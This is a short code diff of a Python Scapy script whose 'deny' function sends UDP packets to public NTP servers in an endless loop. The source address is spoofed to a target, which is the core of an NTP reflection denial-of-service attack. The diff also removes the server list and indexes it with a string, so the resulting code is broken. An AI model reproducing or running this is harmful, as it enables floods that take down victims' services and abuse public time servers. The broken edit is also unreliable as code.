@@ -16,10 +16,8 @@ def deny():
     global currentserver
     global data
     global target
-# Correct
-ntplist = ["pool.ntp.org", "time.google.com"]
-print(ntplist)
-ntpserver = ntplist[currentserver] #Get new server
+
+ntpserver = ntplist["currentserver"] #Get new server
 currentserver = currentserver + 1 #Increment for next
 packet = IP(dst=ntpserver,src=target)/UDP(sport=48947,dport=123)/Raw(load=data) #BUILD IT
 send(packet,loop=1) #SEND IT
